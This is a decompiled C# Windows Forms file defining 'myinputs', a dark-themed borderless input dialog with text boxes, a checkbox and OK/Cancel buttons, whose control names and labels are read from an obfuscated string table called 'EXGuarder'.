using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using DrakeUI.Framework;
using Microsoft.VisualBasic.CompilerServices;

namespace BTMOB;

[DesignerGenerated]
public class myinputs : Form
{
	private IContainer components;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Panel3")]
	private Panel _Panel3;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("msgtitle")]
	private DrakeUILabel _msgtitle;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Panel2")]
	private Panel _Panel2;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("msgimg")]
	private PictureBox _msgimg;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("toppanel")]
	private Panel _toppanel;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("okbtn")]
	private DrakeUIButtonIcon _okbtn;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("nobtn")]
	private DrakeUIButtonIcon _nobtn;

	internal virtual Panel Panel3
	{
		[CompilerGenerated]
		get
		{
			return _Panel3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			MouseEventHandler value2 = msgimg_MouseDown;
			Panel panel = _Panel3;
			if (panel != null)
			{
				panel.MouseDown -= value2;
			}
			_Panel3 = value;
			panel = _Panel3;
			if (panel != null)
			{
				panel.MouseDown += value2;
			}
		}
	}

	internal virtual DrakeUILabel msgtitle
	{
		[CompilerGenerated]
		get
		{
			return _msgtitle;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			MouseEventHandler value2 = msgimg_MouseDown;
			DrakeUILabel drakeUILabel = _msgtitle;
			if (drakeUILabel != null)
			{
				drakeUILabel.MouseDown -= value2;
			}
			_msgtitle = value;
			drakeUILabel = _msgtitle;
			if (drakeUILabel != null)
			{
				drakeUILabel.MouseDown += value2;
			}
		}
	}

	[field: AccessedThroughProperty("DrakeWidth_W4")]
	internal virtual DrakeWidth_W DrakeWidth_W4
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Panel Panel2
	{
		[CompilerGenerated]
		get
		{
			return _Panel2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			MouseEventHandler value2 = msgimg_MouseDown;
			Panel panel = _Panel2;
			if (panel != null)
			{
				panel.MouseDown -= value2;
			}
			_Panel2 = value;
			panel = _Panel2;
			if (panel != null)
			{
				panel.MouseDown += value2;
			}
		}
	}

	[field: AccessedThroughProperty("DrakeWidth_W1")]
	internal virtual DrakeWidth_W DrakeWidth_W1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel1")]
	internal virtual Panel Panel1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual PictureBox msgimg
	{
		[CompilerGenerated]
		get
		{
			return _msgimg;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			MouseEventHandler value2 = msgimg_MouseDown;
			PictureBox pictureBox = _msgimg;
			if (pictureBox != null)
			{
				pictureBox.MouseDown -= value2;
			}
			_msgimg = value;
			pictureBox = _msgimg;
			if (pictureBox != null)
			{
				pictureBox.MouseDown += value2;
			}
		}
	}

	internal virtual Panel toppanel
	{
		[CompilerGenerated]
		get
		{
			return _toppanel;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			MouseEventHandler value2 = msgimg_MouseDown;
			Panel panel = _toppanel;
			if (panel != null)
			{
				panel.MouseDown -= value2;
			}
			_toppanel = value;
			panel = _toppanel;
			if (panel != null)
			{
				panel.MouseDown += value2;
			}
		}
	}

	[field: AccessedThroughProperty("DrakeWidth_W5")]
	internal virtual DrakeWidth_W DrakeWidth_W5
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DrakeWidth_W7")]
	internal virtual DrakeWidth_W DrakeWidth_W7
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DrakeWidth_W8")]
	internal virtual DrakeWidth_W DrakeWidth_W8
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("inputtext")]
	internal virtual DrakeUITextBox inputtext
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("checkfolder")]
	internal virtual DrakeUICheckBox checkfolder
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("inputtext2")]
	internal virtual DrakeUITextBox inputtext2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel4")]
	internal virtual Panel Panel4
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIButtonIcon okbtn
	{
		[CompilerGenerated]
		get
		{
			return _okbtn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = okbtn_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _okbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_okbtn = value;
			drakeUIButtonIcon = _okbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon nobtn
	{
		[CompilerGenerated]
		get
		{
			return _nobtn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = nobtn_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _nobtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_nobtn = value;
			drakeUIButtonIcon = _nobtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("combostext")]
	internal virtual DrakeUIComboBox combostext
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	public myinputs()
	{
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			base.Dispose(disposing);
		}
	}

	[System.Diagnostics.DebuggerStepThrough]
	private void InitializeComponent()
	{
		System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(BTMOB.myinputs));
		this.Panel3 = new System.Windows.Forms.Panel();
		this.combostext = new DrakeUI.Framework.DrakeUIComboBox();
		this.inputtext2 = new DrakeUI.Framework.DrakeUITextBox();
		this.inputtext = new DrakeUI.Framework.DrakeUITextBox();
		this.msgtitle = new DrakeUI.Framework.DrakeUILabel();
		this.DrakeWidth_W4 = new DrakeUI.Framework.DrakeWidth_W();
		this.Panel2 = new System.Windows.Forms.Panel();
		this.checkfolder = new DrakeUI.Framework.DrakeUICheckBox();
		this.nobtn = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.DrakeWidth_W1 = new DrakeUI.Framework.DrakeWidth_W();
		this.okbtn = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.Panel1 = new System.Windows.Forms.Panel();
		this.msgimg = new System.Windows.Forms.PictureBox();
		this.toppanel = new System.Windows.Forms.Panel();
		this.DrakeWidth_W5 = new DrakeUI.Framework.DrakeWidth_W();
		this.DrakeWidth_W7 = new DrakeUI.Framework.DrakeWidth_W();
		this.DrakeWidth_W8 = new DrakeUI.Framework.DrakeWidth_W();
		this.Panel4 = new System.Windows.Forms.Panel();
		this.Panel3.SuspendLayout();
		this.Panel2.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.msgimg).BeginInit();
		this.Panel4.SuspendLayout();
		base.SuspendLayout();
		this.Panel3.Controls.Add(this.combostext);
		this.Panel3.Controls.Add(this.inputtext2);
		this.Panel3.Controls.Add(this.inputtext);
		this.Panel3.Dock = System.Windows.Forms.DockStyle.Fill;
		this.Panel3.Location = new System.Drawing.Point(2, 44);
		this.Panel3.Name = EXGuarder._18623403;
		this.Panel3.Size = new System.Drawing.Size(613, 178);
		this.Panel3.TabIndex = 32;
		this.combostext.DropDownStyle = DrakeUI.Framework.UIDropDownStyle.DropDownList;
		this.combostext.FillColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.combostext.Font = new System.Drawing.Font(EXGuarder._23224E0C, 9f);
		this.combostext.ForeColor = System.Drawing.Color.FromArgb(224, 224, 224);
		this.combostext.Location = new System.Drawing.Point(382, 117);
		this.combostext.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
		this.combostext.MinimumSize = new System.Drawing.Size(56, 0);
		this.combostext.Name = EXGuarder._1F155F21;
		this.combostext.Padding = new System.Windows.Forms.Padding(0, 0, 30, 0);
		this.combostext.Radius = 15;
		this.combostext.RectColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.combostext.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.combostext.Size = new System.Drawing.Size(220, 25);
		this.combostext.Style = DrakeUI.Framework.UIStyle.Custom;
		this.combostext.TabIndex = 65;
		this.combostext.Text = EXGuarder._623F1413;
		this.combostext.TextAlignment = System.Drawing.ContentAlignment.MiddleLeft;
		this.combostext.Visible = false;
		this.inputtext2.Cursor = System.Windows.Forms.Cursors.IBeam;
		this.inputtext2.FillColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.inputtext2.FillDisableColor = System.Drawing.Color.FromArgb(45, 45, 45);
		this.inputtext2.Font = new System.Drawing.Font(EXGuarder._23224E0C, 9f);
		this.inputtext2.ForeColor = System.Drawing.Color.White;
		this.inputtext2.Location = new System.Drawing.Point(11, 80);
		this.inputtext2.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
		this.inputtext2.Maximum = 2147483647.0;
		this.inputtext2.Minimum = -2147483648.0;
		this.inputtext2.Name = EXGuarder._3C1D7459;
		this.inputtext2.Padding = new System.Windows.Forms.Padding(5);
		this.inputtext2.Radius = 15;
		this.inputtext2.RectColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.inputtext2.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.inputtext2.Size = new System.Drawing.Size(591, 25);
		this.inputtext2.Style = DrakeUI.Framework.UIStyle.Custom;
		this.inputtext2.TabIndex = 18;
		this.inputtext2.TextAlignment = System.Drawing.ContentAlignment.TopCenter;
		this.inputtext2.Visible = false;
		this.inputtext2.Watermark = EXGuarder._42131E4F;
		this.inputtext.Cursor = System.Windows.Forms.Cursors.IBeam;
		this.inputtext.FillColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.inputtext.FillDisableColor = System.Drawing.Color.FromArgb(45, 45, 45);
		this.inputtext.Font = new System.Drawing.Font(EXGuarder._23224E0C, 9f);
		this.inputtext.ForeColor = System.Drawing.Color.White;
		this.inputtext.Location = new System.Drawing.Point(11, 29);
		this.inputtext.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
		this.inputtext.Maximum = 2147483647.0;
		this.inputtext.Minimum = -2147483648.0;
		this.inputtext.Name = EXGuarder._5301023F;
		this.inputtext.Padding = new System.Windows.Forms.Padding(5);
		this.inputtext.Radius = 15;
		this.inputtext.RectColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.inputtext.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.inputtext.Size = new System.Drawing.Size(591, 25);
		this.inputtext.Style = DrakeUI.Framework.UIStyle.Custom;
		this.inputtext.TabIndex = 17;
		this.inputtext.TextAlignment = System.Drawing.ContentAlignment.TopCenter;
		this.inputtext.Watermark = EXGuarder._42131E4F;
		this.msgtitle.Dock = System.Windows.Forms.DockStyle.Top;
		this.msgtitle.Font = new System.Drawing.Font(EXGuarder._23224E0C, 12f, System.Drawing.FontStyle.Bold);
		this.msgtitle.ForeColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.msgtitle.Location = new System.Drawing.Point(63, 0);
		this.msgtitle.Name = EXGuarder._70020F5D;
		this.msgtitle.Padding = new System.Windows.Forms.Padding(5);
		this.msgtitle.Size = new System.Drawing.Size(550, 42);
		this.msgtitle.Style = DrakeUI.Framework.UIStyle.Custom;
		this.msgtitle.TabIndex = 2;
		this.msgtitle.Text = EXGuarder._672C2462;
		this.msgtitle.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
		this.DrakeWidth_W4.BackColor = System.Drawing.Color.Gray;
		this.DrakeWidth_W4.Dock = System.Windows.Forms.DockStyle.Bottom;
		this.DrakeWidth_W4.Location = new System.Drawing.Point(2, 222);
		this.DrakeWidth_W4.Name = EXGuarder._194A1144;
		this.DrakeWidth_W4.Size = new System.Drawing.Size(613, 1);
		this.DrakeWidth_W4.TabIndex = 33;
		this.Panel2.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.Panel2.Controls.Add(this.checkfolder);
		this.Panel2.Controls.Add(this.nobtn);
		this.Panel2.Controls.Add(this.DrakeWidth_W1);
		this.Panel2.Controls.Add(this.okbtn);
		this.Panel2.Dock = System.Windows.Forms.DockStyle.Bottom;
		this.Panel2.Location = new System.Drawing.Point(2, 223);
		this.Panel2.Name = EXGuarder._213C4307;
		this.Panel2.Padding = new System.Windows.Forms.Padding(10);
		this.Panel2.Size = new System.Drawing.Size(613, 58);
		this.Panel2.TabIndex = 29;
		this.checkfolder.CheckBoxColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.checkfolder.Cursor = System.Windows.Forms.Cursors.Hand;
		this.checkfolder.Dock = System.Windows.Forms.DockStyle.Fill;
		this.checkfolder.Font = new System.Drawing.Font(EXGuarder._23224E0C, 10f);
		this.checkfolder.ForeColor = System.Drawing.Color.White;
		this.checkfolder.ImageInterval = 15;
		this.checkfolder.Location = new System.Drawing.Point(10, 10);
		this.checkfolder.Name = EXGuarder._74413040;
		this.checkfolder.Padding = new System.Windows.Forms.Padding(46, 0, 0, 0);
		this.checkfolder.Radius = 15;
		this.checkfolder.Size = new System.Drawing.Size(321, 38);
		this.checkfolder.Style = DrakeUI.Framework.UIStyle.Custom;
		this.checkfolder.TabIndex = 18;
		this.checkfolder.Text = EXGuarder._460B4774;
		this.checkfolder.Visible = false;
		this.nobtn.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.nobtn.Cursor = System.Windows.Forms.Cursors.Hand;
		this.nobtn.Dock = System.Windows.Forms.DockStyle.Right;
		this.nobtn.FillColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.nobtn.FillDisableColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.nobtn.FillHoverColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.nobtn.FillPressColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.nobtn.FillSelectedColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.nobtn.Font = new System.Drawing.Font(EXGuarder._23224E0C, 10f);
		this.nobtn.ForeColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.nobtn.ForeHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.nobtn.ForePressColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.nobtn.ForeSelectedColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.nobtn.Location = new System.Drawing.Point(331, 10);
		this.nobtn.Name = EXGuarder._6B117753;
		this.nobtn.Radius = 15;
		this.nobtn.RectColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.nobtn.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.nobtn.RectHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.nobtn.RectPressColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.nobtn.RectSelectedColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.nobtn.Size = new System.Drawing.Size(122, 38);
		this.nobtn.Style = DrakeUI.Framework.UIStyle.Custom;
		this.nobtn.Symbol = 61453;
		this.nobtn.SymbolSize = 20;
		this.nobtn.TabIndex = 44;
		this.nobtn.Text = EXGuarder._1C2F5A5C;
		this.DrakeWidth_W1.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeWidth_W1.Dock = System.Windows.Forms.DockStyle.Right;
		this.DrakeWidth_W1.Location = new System.Drawing.Point(453, 10);
		this.DrakeWidth_W1.Name = EXGuarder._5823673C;
		this.DrakeWidth_W1.Size = new System.Drawing.Size(28, 38);
		this.DrakeWidth_W1.TabIndex = 5;
		this.okbtn.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.okbtn.Cursor = System.Windows.Forms.Cursors.Hand;
		this.okbtn.Dock = System.Windows.Forms.DockStyle.Right;
		this.okbtn.FillColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.okbtn.FillDisableColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.okbtn.FillHoverColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.okbtn.FillPressColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.okbtn.FillSelectedColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.okbtn.Font = new System.Drawing.Font(EXGuarder._23224E0C, 10f);
		this.okbtn.ForeColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.okbtn.ForeHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.okbtn.ForePressColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.okbtn.ForeSelectedColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.okbtn.Location = new System.Drawing.Point(481, 10);
		this.okbtn.Name = EXGuarder._63054063;
		this.okbtn.Radius = 15;
		this.okbtn.RectColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.okbtn.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.okbtn.RectHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.okbtn.RectPressColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.okbtn.RectSelectedColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.okbtn.Size = new System.Drawing.Size(122, 38);
		this.okbtn.Style = DrakeUI.Framework.UIStyle.Custom;
		this.okbtn.SymbolSize = 20;
		this.okbtn.TabIndex = 43;
		this.okbtn.Text = EXGuarder._210D3E16;
		this.Panel1.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.Panel1.Dock = System.Windows.Forms.DockStyle.Bottom;
		this.Panel1.Location = new System.Drawing.Point(2, 281);
		this.Panel1.Name = EXGuarder._3E6D5D06;
		this.Panel1.Size = new System.Drawing.Size(613, 10);
		this.Panel1.TabIndex = 30;
		this.msgimg.Dock = System.Windows.Forms.DockStyle.Left;
		this.msgimg.Image = (System.Drawing.Image)resources.GetObject(EXGuarder._6E6B6E5D);
		this.msgimg.Location = new System.Drawing.Point(0, 0);
		this.msgimg.Name = EXGuarder._48325B23;
		this.msgimg.Size = new System.Drawing.Size(63, 42);
		this.msgimg.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
		this.msgimg.TabIndex = 31;
		this.msgimg.TabStop = false;
		this.toppanel.BackColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.toppanel.Dock = System.Windows.Forms.DockStyle.Top;
		this.toppanel.Location = new System.Drawing.Point(2, 0);
		this.toppanel.Name = EXGuarder._2F380714;
		this.toppanel.Size = new System.Drawing.Size(613, 2);
		this.toppanel.TabIndex = 28;
		this.DrakeWidth_W5.BackColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.DrakeWidth_W5.Dock = System.Windows.Forms.DockStyle.Right;
		this.DrakeWidth_W5.Location = new System.Drawing.Point(615, 0);
		this.DrakeWidth_W5.Name = EXGuarder._0776601B;
		this.DrakeWidth_W5.Size = new System.Drawing.Size(2, 291);
		this.DrakeWidth_W5.TabIndex = 36;
		this.DrakeWidth_W7.BackColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.DrakeWidth_W7.Dock = System.Windows.Forms.DockStyle.Left;
		this.DrakeWidth_W7.Location = new System.Drawing.Point(0, 0);
		this.DrakeWidth_W7.Name = EXGuarder._6B09562F;
		this.DrakeWidth_W7.Size = new System.Drawing.Size(2, 291);
		this.DrakeWidth_W7.TabIndex = 38;
		this.DrakeWidth_W8.BackColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.DrakeWidth_W8.Dock = System.Windows.Forms.DockStyle.Bottom;
		this.DrakeWidth_W8.Location = new System.Drawing.Point(0, 291);
		this.DrakeWidth_W8.Name = EXGuarder._1B42473D;
		this.DrakeWidth_W8.Size = new System.Drawing.Size(617, 2);
		this.DrakeWidth_W8.TabIndex = 37;
		this.Panel4.Controls.Add(this.msgtitle);
		this.Panel4.Controls.Add(this.msgimg);
		this.Panel4.Dock = System.Windows.Forms.DockStyle.Top;
		this.Panel4.Location = new System.Drawing.Point(2, 2);
		this.Panel4.Name = EXGuarder._3C642C25;
		this.Panel4.Size = new System.Drawing.Size(613, 42);
		this.Panel4.TabIndex = 19;
		base.AutoScaleDimensions = new System.Drawing.SizeF(8f, 16f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		this.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		base.ClientSize = new System.Drawing.Size(617, 293);
		base.ControlBox = false;
		base.Controls.Add(this.Panel3);
		base.Controls.Add(this.DrakeWidth_W4);
		base.Controls.Add(this.Panel2);
		base.Controls.Add(this.Panel1);
		base.Controls.Add(this.Panel4);
		base.Controls.Add(this.toppanel);
		base.Controls.Add(this.DrakeWidth_W5);
		base.Controls.Add(this.DrakeWidth_W7);
		base.Controls.Add(this.DrakeWidth_W8);
		this.ForeColor = System.Drawing.Color.White;
		base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
		base.Icon = (System.Drawing.Icon)resources.GetObject(EXGuarder._6D615400);
		base.Name = EXGuarder._5A200C62;
		base.ShowIcon = false;
		base.ShowInTaskbar = false;
		base.StartPosition = System.Windows.Forms.FormStartPosition.CenterParent;
		this.Text = EXGuarder._2A497523;
		base.TopMost = true;
		this.Panel3.ResumeLayout(false);
		this.Panel2.ResumeLayout(false);
		((System.ComponentModel.ISupportInitialize)this.msgimg).EndInit();
		this.Panel4.ResumeLayout(false);
		base.ResumeLayout(false);
	}

	private void msgimg_MouseDown(object sender, MouseEventArgs e)
	{
		try
		{
			if (e.Button == MouseButtons.Left)
			{
				Nativz.ReleaseCapture();
				Nativz.SendMessage(base.Handle, 161, 2, 0);
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			ProjectData.ClearProjectError();
		}
	}

	private void okbtn_Click(object sender, EventArgs e)
	{
		base.DialogResult = DialogResult.OK;
		Close();
	}

	private void nobtn_Click(object sender, EventArgs e)
	{
		base.DialogResult = DialogResult.Abort;
		Close();
	}
}
